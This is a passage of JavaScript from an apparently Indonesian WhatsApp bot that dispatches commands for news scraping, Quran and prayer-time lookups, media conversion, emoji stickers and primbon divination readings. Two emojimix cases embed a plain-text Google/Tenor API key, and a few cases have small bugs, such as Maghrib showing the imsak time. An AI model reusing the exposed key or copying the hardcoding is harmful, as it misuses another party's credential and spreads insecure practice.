case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
 audionya = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await conn.sendMessage(from, { audio: audionya, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6285730672259',
title: `${ownername}`,
sourceUrl: `https://wa.me/6285730672259`, 
thumbnail: thumb
}
}})
break
//=================================================//
case 'pin': case 'pinterest': {
    if (!text) return reply(`Contoh ${prefix + command}`)
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
let { pinterest } = require('./lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
conn.sendMessage(from, {image: { url: result }, caption: `*[ GAMBAR DIATAS ADALAH HASILNYA ]*`},{quoted:m})
}
break
//=================================================//
case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!quoted) return reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
                var medis = await conn.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await conn.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await conn.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
//=================================================//
case 'fajar':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'cnn':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!q) return reply('Judul') 
await loading()
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tribun':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'indozone':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'kompas':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'detik':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
        break

//=================================================//
case 'daily':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'inews':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'mode':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Contoh: ${prefix + command} public/self`)
                if (q == 'public') {
                    conn.public = true
                    reply(`Berhasil Mengaktifkan Mode Public`)
                } else if (q == 'self') {
                    conn.public = false
                    reply(`Berhasil Mengaktifkan Mode Self`)
                }
                break
//===============================================//
case 'okezone':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'sindo':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'antara':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "kontan":
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "merdeka":
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
conn.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "jalantikus":
await loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
conn.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//=================================================
case 'faktaunik':
case 'katabijak':
case 'pantun':
case 'bucin':
await loading()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
reply(data.result)
break
//=================================================
case 'listsurah':
await loading()
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
.then(({ data }) => {
var text = 'List Surah:\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
reply(text)
})
.catch(console.error)
break
//=================================================
case 'alquran':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
await loading()
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
reply(text)
})
.catch(console.error)
break
//=================================================
case 'alquranaudio':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
await loading()
conn.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
break
//=================================================
case 'asmaulhusna':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
axios
.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
.then(({ data }) => {
var text = `No : ${data.result.index}\n`
text += `Latin: ${data.result.latin}\n`
text += `Arab : ${data.result.ar}\n`
text += `Indonesia : ${data.result.id}\n`
text += `English : ${data.result.en}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'kisahnabi':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
await loading()
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Name : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Story : \n${data.result.story}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'jadwalsholat2':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
await loading()
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikeys}`)
.then(({ data }) => {
var text = `Wilayah : ${data.result.wilayah}\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.imsak}\n`
text += `Isya : ${data.result.isya}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'smeme':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
m.reply('*Sabar Cuy Loading*')
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
conn.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break
//=================================================
case 'toimage': case 'toimg': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply(`Balas sticker dengan caption *${prefix + command}*`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
conn.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
await loading()
let media = await conn.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : m })
}
break
//=================================================//
case 'toaudio': case 'audio': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
await loading()
let media = await conn.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
//=================================================//
case 'tovn': case 'voice': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
m.reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
conn.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6285730672259',
title: `${ownername}`,
sourceUrl: `https://wa.me/6285730672259`, 
thumbnail: thumb
}
}})
}
break
//=================================================//
case 'togif': case 'tomp4': case 'tovideo':{
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply(`*reply sticker with caption* *${prefix + command}*`)
await loading()
 let { webp2mp4File } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await conn.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
await loading()
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case "quotes":
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
await loading()
 var resi = await Quotes()
teks = `\nAuthor: ${resi.author}\n`
teks = `\nQuotes:\n`
teks = `${resi.quotes}\n`
reply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
await loading()
 var ress = await Darkjokes()
teks = "*Darkjokes*"
conn.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
break
//=================================================//
case 'emojimix': { 
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) return m.reply(`Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return m.reply(`Example : ${prefix + command} 😅+🤔`)
await loading()
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await conn.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} 😅`)
 await loading()
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await conn.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} belanja`)
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} Ujang, 7, 7, 2005, Putri, 16, 11, 2004`)
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
    if (isBan) return '*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*';
    if (!text) return reply(`Example : ${prefix + command} krey`)
    let anu = await primbon.arti_nama(text);
    if (anu.status == false) return anu.message;
    conn.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m);
    break;
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} Ujang, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan':
case 'cocokpasangan':
case 'pasangan': {
    if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
    if (!text) return m.reply(`Example : ${prefix + command} raffi|gigi`)
    let [nama1, nama2] = text.split`|`
    let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
    if (anu.status == false) return m.reply(anu.message)
    conn.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
    break;
}
break
//=================================================//
case 'jadianpernikahan':
case 'jadiannikah': {
    if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
    if (!text) return reply(`Example : ${prefix + command} 6, 12, 2020`)
    let [tgl, bln, thn] = text.split`,`
    if (!tgl || !bln || !thn) return reply('Input yang Anda masukkan tidak valid. Pastikan Anda memasukkan tanggal, bulan, dan tahun dalam format yang benar.')
    let anu = await primbon.tanggal_jadian_pernikahan(tgl.trim(), bln.trim(), thn.trim())
    if (anu.status == false) return m.reply(anu.message)
    conn.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
    break;
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} Ujang, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
